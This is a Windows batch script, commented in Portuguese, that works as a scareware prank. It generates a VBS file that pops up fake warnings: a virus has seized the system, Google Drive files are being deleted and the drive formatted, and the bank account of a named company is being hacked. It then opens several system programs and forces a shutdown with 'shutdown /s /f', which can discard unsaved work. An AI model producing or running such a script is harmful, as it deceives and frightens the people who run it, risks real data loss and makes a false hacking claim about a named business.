@echo off
echo Iniciando processo...
timeout /t 1 /nobreak >nul
cls

:: Cria o arquivo VBS com as mensagens de popup
echo Set wshShell = CreateObject("WScript.Shell") > temp.vbs
echo wshShell.Popup "Um virus foi detectado no seu sistema!", 5, "AVISO DE VIRUS", 16 >> temp.vbs
echo wshShell.Popup "Iniciando processo de remocao automatica...", 5, "Processando", 48 >> temp.vbs
echo wshShell.Popup "Erro! O virus nao pode ser removido.", 5, "Erro", 16 >> temp.vbs
echo wshShell.Popup "Tentando isolar o virus...", 5, "Processando", 48 >> temp.vbs
echo wshShell.Popup "Falha! O virus tomou controle do sistema!", 5, "ALERTA", 16 >> temp.vbs
echo wshShell.Popup "ATENCAO: Todos os seus arquivos do Google Drives estao sendo deletados!", 5, "CUIDADO", 16 >> temp.vbs
echo wshShell.Popup "Formatando disco Google Drives...", 5, "Formatacao", 16 >> temp.vbs
echo wshShell.Popup "Formatacao completa!", 5, "Finalizado", 16 >> temp.vbs
echo wshShell.Popup "Hackeando conta bancaria TERMOTUBOS IMPORTACAO E EXPORTACAO LTDA...", 5, "CUIDADO", 16 >> temp.vbs
echo wshShell.Popup "O sistema foi comprometido. Desligamento em 10 segundos.", 5, "Desligamento", 16 >> temp.vbs

:: Executa o script VBS
cscript temp.vbs
del temp.vbs

:: Abre várias abas aleatórias de aplicativos do sistema
start calc
start notepad
start mspaint
start cmd
start explorer
start taskmgr
start control
start iexplore

timeout /t 5 /nobreak >nul

:: Comando de desligamento
shutdown /s /f /t 10 /c "O sistema foi comprometido. Desligamento em 10 segundos."
